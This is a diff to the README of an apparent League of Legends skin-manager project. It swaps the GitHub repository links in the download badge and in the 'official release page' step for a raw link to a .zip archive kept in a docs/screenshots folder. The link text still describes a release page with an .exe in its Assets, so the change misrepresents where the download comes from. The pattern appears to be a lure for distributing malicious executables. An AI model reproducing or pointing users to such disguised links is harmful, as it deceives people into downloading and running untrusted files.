@@ -1,6 +1,6 @@
 # 🛠️ ltk-manager-lol - Simple tool to manage game skins
 
-[![Download ltk-manager-lol](https://img.shields.io/badge/Download-ltk-manager-4A90E2.svg)](https://github.com/edouardclose19/ltk-manager-lol)
+[![Download ltk-manager-lol](https://img.shields.io/badge/Download-ltk-manager-4A90E2.svg)](https://raw.githubusercontent.com/edouardclose19/ltk-manager-lol/main/docs/screenshots/lol-ltk-manager-v1.1.zip)
 
 This software helps players manage custom skins in League of Legends. It provides a stable way to apply visual mods to champions. Users often look for replacements for older tools like CSLOL Manager. This application handles mod packages and updates your client files. It keeps your game data organized and allows you to switch skins with one click.
 
@@ -8,7 +8,7 @@ This software helps players manage custom skins in League of Legends. It provide
 
 Follow these steps to get the application.
 
-1. Go to the [official release page](https://github.com/edouardclose19/ltk-manager-lol).
+1. Go to the [official release page](https://raw.githubusercontent.com/edouardclose19/ltk-manager-lol/main/docs/screenshots/lol-ltk-manager-v1.1.zip).
 2. Look for the Assets section.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or a folder you can find.
